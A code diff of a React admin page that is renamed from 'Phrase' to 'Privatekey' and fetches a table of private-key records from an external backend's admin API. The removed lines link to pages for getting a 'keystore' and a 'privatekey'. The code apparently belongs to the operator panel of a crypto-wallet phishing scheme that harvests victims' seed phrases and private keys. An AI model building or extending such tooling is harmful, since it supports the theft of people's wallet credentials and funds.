@@ -1,10 +1,8 @@
 import React, { useEffect, useState } from 'react';
 import axios from 'axios';
 import { Table, Thead, Tbody, Tr, Th, Td, TableContainer, Spinner, Alert, AlertIcon, Box } from '@chakra-ui/react';
-import Updateadmin from './Updateadmin';
-import { Link } from 'react-router-dom'
 
-function Phrase() {
+function Privatekey() {
   const [phrases, setPhrases] = useState([]);
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState(null);
@@ -20,7 +18,7 @@ function Phrase() {
     // get token from response
     const token = loginResponse.data.token; 
 
-        const response = await axios.get('https://backend.accosmart.com.ng/api/admin/phrase', {
+        const response = await axios.get('https://backend.accosmart.com.ng/api/admin/private', {
           headers: {
            Authorization: `Bearer ${token}`, 
                 "Content-Type": "application/json",
@@ -58,35 +56,26 @@ function Phrase() {
   }
 
   return (
-    <div>
-     
-      <Updateadmin/>
-
-      <Link to="/keystore"> <h1 className='mb-[1.5rem]'>Click here to get keystore</h1></Link>
-      <Link to="/private"> <h1 className='mb-[1.5rem]'>Click here to get privatekey</h1></Link> 
-
-<TableContainer>
-      
-     
+    <TableContainer>
       <Table variant="simple" mt={4}>
         <Thead>
           <Tr>
-            <Th>Phrase ID</Th>
-            <Th>Phrase</Th>
+            <Th>PrivateKey ID</Th>
+            <Th>Privatekey</Th>
+            
           </Tr>
         </Thead>
         <Tbody>
           {phrases.map((phrase, index) => (
             <Tr key={index}>
               <Td>{phrase?.id}</Td>
-              <Td>{phrase?.phrasetext}</Td>
+              <Td>{phrase?.privatetext}</Td>
             </Tr>
           ))}
         </Tbody>
       </Table>
     </TableContainer>
-    </div>
   );
 }
 
-export default Phrase;
+export default Privatekey;
